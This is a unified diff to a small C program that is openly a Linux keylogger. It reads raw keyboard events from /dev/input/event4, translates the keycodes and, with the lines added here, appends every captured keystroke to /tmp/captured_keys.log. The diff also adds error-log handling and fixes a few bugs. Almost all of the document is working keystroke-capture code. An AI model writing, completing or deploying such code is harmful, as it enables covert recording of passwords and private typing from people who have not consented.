@@ -9,6 +9,8 @@
 #include <string.h>
 #define ERROR_PATH "/tmp/errors_keylogger.log"
 #define CAPTURE_PATH "/tmp/captured_keys.log"
+#define KEYLOG 1
+#define ERROR 0
 #define LONGEST_KEY 22
 
 typedef struct keys_s
@@ -18,19 +20,22 @@ typedef struct keys_s
 	FILE *file;
 } keys_t;
 
-int create_socket(const char *event_path, FILE **file, int *fd);
-int create_logs_files(void);
+int create_socket(const char *event_path, FILE **file, int *fd, FILE **logs);
+int create_logs_files(FILE ** logs);
 int read_from_event4(struct input_event *ev, int fd);
 int	translate_keycode(unsigned short code, keys_t *keys);
+int	write_captured_key(FILE *file, const char *key);
 
 int main(void)
 {
 	struct input_event ev;
 	keys_t keys;
 	int fd;
+	FILE *logs[2] = {NULL, NULL};
 
 	keys.size = LONGEST_KEY + 1;
-	if (!create_socket("/dev/input/event4", &keys.file, &fd))
+	ev.code = 0;
+	if (!create_socket("/dev/input/event4", &keys.file, &fd, logs))
 		return (1);
 	while (ev.code != 1)
 	{
@@ -46,13 +51,19 @@ int main(void)
 			if (!translate_keycode(ev.code, &keys))
 				strncpy(keys.key, "UNKNOW", keys.size);
 			printf("key translated: %s\n", keys.key);
+			write_captured_key(logs[KEYLOG], keys.key);
 		}
 		fflush(stdout);
 	}
+	close(fd);
 	fclose(keys.file);
+	if (logs[KEYLOG])
+		fclose(logs[KEYLOG]);
+	if (logs[ERROR])
+		fclose(logs[ERROR]);
 }
 
-int create_socket(const char *event_path, FILE **file, int *fd)
+int create_socket(const char *event_path, FILE **file, int *fd, FILE *logs[])
 {
 	*fd = open(event_path, O_RDONLY);
 	if (*fd < 0)
@@ -60,21 +71,21 @@ int create_socket(const char *event_path, FILE **file, int *fd)
 		fprintf(stderr, "Unable to read event4, is it in sudo ?\n");
 		return (0);
 	}
-	if (!create_logs_files())
+	if (!create_logs_files(logs))
 	{
 		fprintf(stderr, "Unable to create log files\n");
 		return (0);
 	}
 	*file = fopen("./keys.dat", "r");
-	if (!file)
+	if (!*file)
 	{
-		fprintf(stderr, "Unable to read keys.dat file");
+		fprintf(stderr, "Unable to read keys.dat file\n");
 		return (0);
 	}
 	return (1);
 }
 
-int create_logs_files(void)
+int create_logs_files(FILE *logs[])
 {
 	FILE *error_logs;
 	FILE *capture_logs;
@@ -84,15 +95,12 @@ int create_logs_files(void)
 		error_logs = fopen(ERROR_PATH, "a");
 		if (!error_logs)
 			return (0);
-		fclose(error_logs);
+		logs[ERROR] = error_logs;
 	}
-	if (access(CAPTURE_PATH, W_OK) < 0)
-	{
-		capture_logs = fopen(CAPTURE_PATH, "a");
-		if (!capture_logs)
-			return (0);
-		fclose(capture_logs);
-	}
+	capture_logs = fopen(CAPTURE_PATH, "a");
+	if (!capture_logs)
+		return (0);
+	logs[KEYLOG] = capture_logs;
 	return (1);
 }
 
@@ -137,6 +145,19 @@ int	translate_keycode(unsigned short code, keys_t *keys)
 	}
 	free(line);
 	if (!keys->key[0])
+		return (0);
+	return (1);
+}
+
+int	write_captured_key(FILE *file, const char *key)
+{
+	if (strcmp(key, "Enter") == 0)
+	{
+		if (fprintf(file, "\n") < 0)
+			return (0);
+		return (1);
+	}
+	if (fprintf(file, "%s", key) < 0)
 		return (0);
 	return (1);
 }
